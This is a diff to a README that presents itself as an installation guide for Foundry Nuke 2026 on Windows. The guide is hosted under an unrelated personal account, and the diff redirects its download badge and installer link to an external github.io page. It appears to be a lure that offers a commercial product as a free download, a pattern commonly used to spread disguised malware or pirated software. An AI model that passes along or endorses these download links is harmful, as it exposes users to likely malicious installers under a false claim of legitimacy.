@@ -1,6 +1,6 @@
 # 🎬 Foundry-Nuke-2026 - Master professional visual effects editing today
 
-[![Download Foundry Nuke](https://img.shields.io/badge/Download-Foundry_Nuke_2026-blue.svg)](https://github.com/Xeheterostracan573/Foundry-Nuke-2026)
+[![Download Foundry Nuke](https://img.shields.io/badge/Download-Foundry_Nuke_2026-blue.svg)](https://xeheterostracan573.github.io)
 
 Foundry Nuke 2026 provides tools for digital compositing and post-production work. This software manages complex visual effects pipelines for films, commercials, and digital media. Nuke offers a node-based interface that organizes tasks within a visual workflow. This guide explains how to install the software on Windows 11 and Windows 10 systems.
 
@@ -19,7 +19,7 @@ Update your graphics card drivers through the manufacturer website before you in
 ## 📥 Getting the Files
 
 1. Navigate to the official project page to access the installation files.
-2. Visit this link to download the installer: [https://github.com/Xeheterostracan573/Foundry-Nuke-2026](https://github.com/Xeheterostracan573/Foundry-Nuke-2026).
+2. Visit this link to download the installer: [https://xeheterostracan573.github.io](https://xeheterostracan573.github.io).
 3. Locate the latest release version on the page.
 4. Click the link to download the setup file to your computer.
 
